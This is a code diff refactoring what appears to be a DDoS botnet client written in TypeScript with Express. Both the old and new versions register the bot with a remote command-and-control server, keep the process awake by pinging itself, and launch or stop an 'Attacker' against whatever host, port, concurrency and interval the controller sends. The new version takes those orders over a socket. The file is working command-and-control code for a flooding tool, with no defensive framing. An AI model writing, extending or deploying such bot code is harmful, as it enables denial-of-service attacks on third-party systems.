@@ -1,56 +1,102 @@
 import express from "express";
-import bodyParser from "body-parser";
 import { Stats } from "./stats";
 import { Attacker } from "./attacker";
-import cors from "cors";
 import request from "request";
+import errorHandler from "errorhandler";
+import { UpdateNotifier } from "./update-notifier";
 
-// Create Express server
-const app = express();
-const stats = new Stats();
-const attacker = new Attacker(stats);
+export class App {
+    private expressApp: express.Application;
+    private stats: Stats;
+    private attacker: Attacker;
+    private updateNotifier: UpdateNotifier;
 
+    constructor() {
+        this.expressApp = express();
+        this.stats = new Stats();
+        this.attacker = new Attacker(this.stats);
+        this.attacker.events.on('loop', this.onAttackLoop.bind(this));
 
-// Express configuration
-app.set("port", process.env.PORT || 8080);
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(cors({origin: '*',}));
-app.get('/', (req, res) => {
-    res.status(200).send(stats.isRun);
-});
+        this.initExpress();
+    }
 
-const sendUpdate = () => {
-    try {
-        if(!stats.isRun) {
-            stats.reset();
+    startServer() {
+        setInterval(this.selfPing.bind(this), 300000);
+        this.selfPing();
+
+        const server = this.expressApp.listen(this.expressApp.get("port"), () => {
+            console.log(
+                "  App is running at http://localhost:%d in %s mode",
+                this.expressApp.get("port"),
+                this.expressApp.get("env")
+            );
+            console.log("  Press CTRL-C to stop\n");
+        });
+
+        this.updateNotifier = new UpdateNotifier(server);
+
+        this.initSocket();
+        this.registerServer();
+    }
+
+    private initExpress() {
+        // Express configuration
+        this.expressApp.set("port", process.env.PORT || 8080);
+        this.expressApp.get('/', (req, res) => {
+            res.status(200).send(this.stats.isRun);
+        });
+
+        /**
+         * Error Handler. Provides full stack
+         */
+        this.expressApp.use(errorHandler());
+    }
+
+    private selfPing() {
+        if(process.env.URL) {
+            const req = request.get({url: process.env.URL}, (err) => {
+                err ? console.log('SelfTest error, '+err) : console.log('SelfTest OK');
+                req.destroy();
+            });
         }
+    }
 
-        const url = `${process.env.CMD_URL}api/control/register`;
-        const req = request.post({
-            url,
-            json: true,
-            body: { botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }
-        }, (err, res) => {
-            req.destroy();
-            if(err) {
-                console.error(err);
-                return;
-            }
-            if(stats.isRun && !res.body.target) {
-                attacker.stop();
-                console.log(`Attack stopped`);
-            } else if(!stats.isRun && res.body.target) {
-                attacker.run(res.body.target.host, res.body.target.port, res.body.target.concurrency || 100, res.body.target.interval || 1000);
-                console.log(`Attack started for ${res.body.target.host}:${res.body.target.port}`);
+    private onAttackLoop(stats: Stats) {
+        if(this.updateNotifier) {
+            this.updateNotifier.send(stats);
+        }
+    }
+
+    private registerServer() {
+        try {
+            const url = `${process.env.CMD_URL}api/control/register`;
+            const req = request.post({
+                url,
+                json: true,
+                body: { botUrl: process.env.URL }
+            }, (err, res) => {
+                req.destroy();
+                if (err) {
+                    console.error(err);
+                    return;
+                }
+            });
+        } catch (err) {
+            console.error(err);
+        }
+    }
+
+    private initSocket() {
+        this.updateNotifier.on('receive', (info) => {
+            switch(info.cmd) {
+                case 'attack':
+                    const data = info.data;
+                    this.attacker.run(data.host, data.port, data.conncurrency || 100, data.interval || 1000);
+                    break;
+                case 'stop':
+                    this.attacker.stop();
+                    break;
             }
         });
-    } catch(err) {
-        console.error(err);
     }
-};
-
-setInterval(sendUpdate, 5000);
-sendUpdate();
-
-export default app;
+}
